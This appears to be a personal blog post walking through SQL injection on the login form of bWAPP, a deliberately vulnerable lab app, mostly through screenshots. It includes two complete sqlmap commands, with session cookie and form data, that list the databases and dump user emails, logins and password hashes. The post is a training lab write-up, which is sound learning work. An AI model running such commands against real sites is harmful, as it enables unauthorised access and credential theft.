---
layout: post
title: SQL Injection (Login Form\User)
categories:
  - Web-Pentesting
---

<br>..

![102](https://teckk2.github.io/assets/images/Web%20Pentest/A1/102.png)
![103](https://teckk2.github.io/assets/images/Web%20Pentest/A1/103.png)
![104](https://teckk2.github.io/assets/images/Web%20Pentest/A1/104.png)
<br>Using single quote in the login form we got the SQL error
<br>I tried few manual bypass techniques but it’s not working or maybe it could be blind SQLi, so I am using SQLmap for this to enumerate it further.
<br>For that, First capture the login request in burp
![105](https://teckk2.github.io/assets/images/Web%20Pentest/A1/105.png)
![106](https://teckk2.github.io/assets/images/Web%20Pentest/A1/106.png)
<br>To start with SQLmap we need URL, Cookie and login-password form
![107](https://teckk2.github.io/assets/images/Web%20Pentest/A1/107.png)
<br><font color="Black">{ sqlmap -u "http://192.168.140.139/bWAPP/sqli_16.php" --cookie="PHPSESSID=9d942f4327321b4cc8a5fe27b5b78d7d; security_level=0" --data="login=test&password=test&form=submit" –dbs --fresh-queries }</font>
![108](https://teckk2.github.io/assets/images/Web%20Pentest/A1/108.png)
![109](https://teckk2.github.io/assets/images/Web%20Pentest/A1/109.png)
<br>And in the end we can see in the result the name of the databases available.
![110](https://teckk2.github.io/assets/images/Web%20Pentest/A1/110.png)
<br>Now dump the Database
![111](https://teckk2.github.io/assets/images/Web%20Pentest/A1/111.png)
<br>And there is 5 tables available in it, now let’s check what’s inside the table “users”
![112](https://teckk2.github.io/assets/images/Web%20Pentest/A1/112.png)
![113](https://teckk2.github.io/assets/images/Web%20Pentest/A1/113.png)
<br>Inside users table there are 09 columns let’s dump the login and password of the users.
![114](https://teckk2.github.io/assets/images/Web%20Pentest/A1/114.png)
<br><font color="Black">{ sqlmap -u "http://192.168.140.139/bWAPP/sqli_16.php" --cookie="PHPSESSID=9d942f4327321b4cc8a5fe27b5b78d7d; security_level=0" --data="login=test&password=test&form=submit" -D bWAPP -t users -C email,login,password –dump }</font>
![115](https://teckk2.github.io/assets/images/Web%20Pentest/A1/115.png)
![116](https://teckk2.github.io/assets/images/Web%20Pentest/A1/116.png)
![117](https://teckk2.github.io/assets/images/Web%20Pentest/A1/117.png)
<br>Using SQLmap we eventually dumped all the emails, login and password with their hashes in just few steps which would be difficult for us to do it manually.

<p class="message">
  ~ Hack the World and Stay Noob
</p>

[Twitter](https://twitter.com/Teck__K2) / [Hack The Box](https://www.hackthebox.eu/profile/966) / [CTF Team](https://ctftime.org/team/20102) /
[Teck_N00bs Community Telegram](https://t.me/Teck_N00bs)

<script src="https://www.hackthebox.eu/badge/966"> </script>


